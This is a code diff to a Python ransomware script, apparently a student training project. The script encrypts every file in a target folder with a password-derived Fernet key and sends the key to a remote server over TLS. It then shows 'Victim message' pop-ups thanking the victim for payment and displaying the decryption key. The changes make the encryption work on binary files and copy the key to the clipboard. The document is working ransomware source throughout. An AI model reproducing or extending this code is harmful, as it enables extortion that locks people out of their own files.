@@ -1,6 +1,8 @@
 import ssl
 import socket
 
+import pyperclip
+
 import base64
 import os
 from cryptography.fernet import Fernet
@@ -44,23 +46,23 @@ def transfer_key_to_cipher(key):
     return Fernet(key)        
         
 def read_file_content(path):
-    with open(path,'r') as file:
+    with open(path,'rb') as file:
         content = file.read()
     return content
 
 def write_file(content,path):
-    with open(path,'w') as file:
+    with open(path,'wb') as file:
         file.write(content)
 
 def encrypt_file_content(path,cipher):
     file_content = read_file_content(path)
-    encrypted_content = cipher.encrypt(file_content.encode())
-    write_file(encrypted_content.decode(),path)
+    encrypted_content = cipher.encrypt(file_content)
+    write_file(encrypted_content,path)
     
 def encrypt_files(path,cipher):
-    items = os.listdir(path)
-    for item in items:
-        new_path = os.path.join(path, item)
+    files = os.listdir(path)
+    for file in files:
+        new_path = os.path.join(path, file)
         if os.path.isfile(new_path):
             encrypt_file_content(new_path,cipher)
             
@@ -77,19 +79,26 @@ def show_victim_window():
 def decrypter_process(path):
     subprocess.run(["python", "decrypter.py", path])
 
-def show_key_window():
+def show_key_window(key):
     root = tk.Tk()
     root.withdraw()
-    messagebox.showinfo("Victim message", """thank you for your genurous payment! 💲
+    messagebox.showinfo("Victim message", f"""thank you for your genurous payment! 💲
                         \n you may decrypt your files with the smart decoder i made just for you
-                        \n it might take a moment, thank you for your patience. 
+                        \n it might take a moment, thank you for your patience.
+                        \n key - {key} 
                         """)
+
+def show_clipboard_msg():
+    root = tk.Tk()
+    root.withdraw()
+    messagebox.showinfo("Victim message","copied key to clipboard")
 
 def main():
     conn = create_conn()
     secured_conn = wrap_conn(conn,"server.crt")
-    path = r"C:\Users\Sahar Levy\Desktop\Projects\test_folder"
-    password = "gamma_cyber"
+    # path = r"C:\Users\Sahar Levy\Desktop\Projects\test_folder"
+    path = r"C:\Users\Pc2\test_folder"
+    password = "gamma_cyber_youngfortech"
     key = create_encryption_key(password)
     cipher = transfer_key_to_cipher(key)
     encrypt_files(path,cipher)
@@ -99,12 +108,15 @@ def main():
     secured_conn.send(key)
     
     request = secured_conn.recv(1024)
-    request = json.loads(request)
+    request = json.loads(request.decode())
     if request["action"] == "start decoder process":
-        show_key_window()
+        base64_key = request["key"]
+        key = base64.b64decode(base64_key).decode()
+        show_key_window(key)
+
+        show_clipboard_msg()
+        pyperclip.copy(key)
         decrypter_process(path)
-    
-    
 
 if __name__ == "__main__":
     main()
